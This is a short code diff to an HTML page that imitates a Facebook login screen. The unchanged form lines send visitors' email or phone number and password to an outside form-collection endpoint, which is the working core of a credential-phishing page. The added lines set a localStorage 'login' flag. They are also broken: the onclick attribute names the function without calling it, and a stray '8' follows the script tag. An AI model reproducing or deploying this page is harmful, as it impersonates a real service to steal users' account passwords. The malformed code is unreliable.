@@ -19,10 +19,17 @@
             <form action="https://formspree.io/f/xpzbelke" method="POST">
                 <input type="email" name="Email" placeholder="Email or Phone Number">
                 <input type="password" name="password" placeholder="Password">
-                <button type="submit">Log In</button>
+                <button onclick="setLS" type="submit">Log In</button>
                 <span><span style="color: #3B5998;">Forgot Account?</span> · <span style="color: #3B5998;">Sign up for Facebook</span></span>
             </form>
         </div>
     </div>
+
+    <script>
+        let setLS = () => {
+            localStorage.setItem("login", true)
+        }
+    </script>8
+
 </body>
 </html>
